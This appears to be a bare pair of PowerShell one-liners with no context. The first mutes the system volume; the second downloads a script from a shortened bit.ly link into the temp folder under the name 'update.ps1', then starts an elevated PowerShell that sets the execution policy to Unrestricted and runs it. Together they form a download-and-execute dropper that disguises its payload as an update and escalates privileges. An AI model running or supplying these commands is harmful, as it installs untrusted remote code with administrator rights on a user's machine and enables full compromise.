powershell (new-object -com wscript.shell).SendKeys([char]173)

powershell (new-object System.Net.WebClient).Downloadfile(\"http://bit.ly/2h8YU4Y\", \"$env:temp\update.ps1\"); Start-Process "$psHome\powershell.exe" -Verb RunAs \"Set-ExecutionPolicy Unrestricted -Force; & "$env:temp\update.ps1"\"
